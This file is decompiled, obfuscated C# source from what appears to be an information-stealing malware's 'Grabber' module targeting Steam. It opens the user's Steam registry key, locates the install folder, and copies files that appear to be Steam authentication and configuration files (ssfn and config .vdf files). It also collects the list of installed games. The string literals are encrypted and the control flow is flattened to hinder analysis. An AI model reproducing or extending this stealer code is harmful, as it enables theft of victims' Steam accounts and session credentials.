using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.Win32;

namespace Application.Grabber.Applications
{
	// Token: 0x0200003D RID: 61
	internal class Steam
	{
		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060001F9 RID: 505 RVA: 0x0000D4B8 File Offset: 0x0000B6B8
		// (set) Token: 0x060001FA RID: 506 RVA: 0x0000D4CC File Offset: 0x0000B6CC
		public static int Count { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x060001FB RID: 507 RVA: 0x0000D4E0 File Offset: 0x0000B6E0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static List<FileObject> Execute()
		{
			List<FileObject> list;
			string text;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					RegistryKey registryKey;
					switch (num)
					{
					case 0:
						if (registryKey == null)
						{
							return list;
						}
						goto IL_36;
					case 1:
						goto IL_B0;
					case 2:
						goto IL_36;
					case 3:
						list = new List<FileObject>();
						registryKey = delegate0123.f000157(Registry.CurrentUser, c0000c0.m00000f("Ân+\u0010Ñ\bARð$/@~ò\u00114âç\u000f\v"));
						num = delegate0da.f0000d7(0);
						continue;
					}
					break;
					IL_36:
					text = registryKey.GetValue(c0000c0.m00000f("Âu(\u0005Ë9RCÄ")).ToString();
					list.Add(Steam.GetGames(registryKey));
					num = delegate0da.f0000d7(-1);
				}
			}
			return list;
			IL_B0:
			list.AddRange(Helper.CopyAll(text, c0000c0.m00000f("Ðq=\bÏ\nRCÅ\u001d _TÄ9\u0002÷ï2\u0015^¢t"), c0000c0.m00000f("»r>\u0002ÈC"), SearchOption.TopDirectoryOnly));
			list.AddRange(Helper.CopyAll(delegate0d0.f0000ba(text, c0000c0.m00000f("Íb\"\nÀ\0T")), c0000c0.m00000f("Ðq=\bÏ\nRCÅ\u001d _TÄ9\u0002÷ï2\u0005Bª|Ä4Í"), c0000c0.m00000f("»w)\u0002\u008c"), SearchOption.TopDirectoryOnly));
			if (list.Count > 0)
			{
				Steam.Count++;
			}
			return list;
		}

		// Token: 0x060001FC RID: 508 RVA: 0x0000D60C File Offset: 0x0000B80C
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static FileObject GetGames(RegistryKey registry)
		{
			StringBuilder p = new StringBuilder();
			foreach (string text in delegate0124.f000158(delegate0123.f000157(registry, c0000c0.m00000f("Ðq=\u0017"))))
			{
				RegistryKey registryKey = delegate0123.f000157(registry, delegate0d0.f0000ba(c0000c0.m00000f("Ðq=\u0017ú"), text));
				string text2 = (string)registryKey.GetValue(c0000c0.m00000f("ß` \u0001"));
				string text3 = ((int)registryKey.GetValue(c0000c0.m00000f("Øo>\u0010Ç\u0005_RÈ")) == 1) ? c0000c0.m00000f("Èd>") : c0000c0.m00000f("ßn");
				string text4 = ((int)registryKey.GetValue(c0000c0.m00000f("Ãt#\nÏ\aT")) == 1) ? c0000c0.m00000f("Èd>") : c0000c0.m00000f("ßn");
				delegate0f7.f00010e(p, delegate0d1.f0000bd(new string[]
				{
					c0000c0.m00000f("ß` \u0001\u0086"),
					text2,
					c0000c0.m00000f("\u009bH)^\u0086"),
					text,
					c0000c0.m00000f("\u009bH#\u0017Ò\b_[É\u0016t\f"),
					text3,
					c0000c0.m00000f("\u009bS8\nÈ\0]P\u0096R"),
					text4,
					c0000c0.m00000f("\u009b")
				}));
			}
			return new FileObject(c0000c0.m00000f("Ðq=\bÏ\nRCÅ\u001d _TÄ9\u0002÷ï2']´vÄ0ß\u0003·xÖ\u0090\u0098iO>"), delegate0cd.f0000a6(p));
		}

		// Token: 0x060001FD RID: 509 RVA: 0x0000D794 File Offset: 0x0000B994
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Steam()
		{
		}

		// Token: 0x060001FE RID: 510 RVA: 0x0000D79C File Offset: 0x0000B99C
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Steam()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x0400009C RID: 156
		[CompilerGenerated]
		private static int f00001a;
	}
}
